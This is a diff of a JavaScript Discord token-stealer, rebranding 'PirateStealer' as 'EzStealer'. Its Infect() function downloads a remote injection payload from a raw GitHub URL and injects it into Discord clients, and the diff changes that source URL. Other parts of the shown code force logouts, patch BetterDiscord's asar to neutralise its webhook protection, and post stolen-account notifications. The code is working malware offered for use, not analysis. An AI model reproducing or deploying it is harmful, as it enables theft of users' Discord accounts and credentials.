@@ -41,7 +41,7 @@ discords.forEach(function(file) {
 });
 listDiscords();
 function Infect() {
-    https.get('https://raw.githubusercontent.com/StampyGumball/pirate-stealer-by-bytixo/main/src/Injection/injection', (resp) => {
+    https.get('https://raw.githubusercontent.com/glosifyed/InjectionLOL/main/ezstealer', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
@@ -60,7 +60,7 @@ function Infect() {
                 }
                 if ( config.logout != "false" ) {
 
-                    let folder = file.replace("index.js", "PirateStealerBTW")
+                    let folder = file.replace("index.js", "EzStealerBTW")
                     if (!fs.existsSync(folder)) {
                         fs.mkdirSync(folder, 0744)
                         if (config.logout == "instant") {
@@ -145,7 +145,7 @@ function pwnBetterDiscord() {
     var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
     if (fs.existsSync(dir)) {
         var x = fs.readFileSync(dir)
-        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "stanleyisgod"))
+        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "tanaisgod"))
     } else {
         return;
     }
@@ -172,10 +172,10 @@ function injectNotify() {
             "color": config["embed-color"],
             "fields": fields,
             "author": {
-              "name": "PirateStealer"
+              "name": "EzStealer"
             },
             "footer": {
-              "text": "PirateStealer"
+              "text": "EzStealer"
             }
           }
         ]
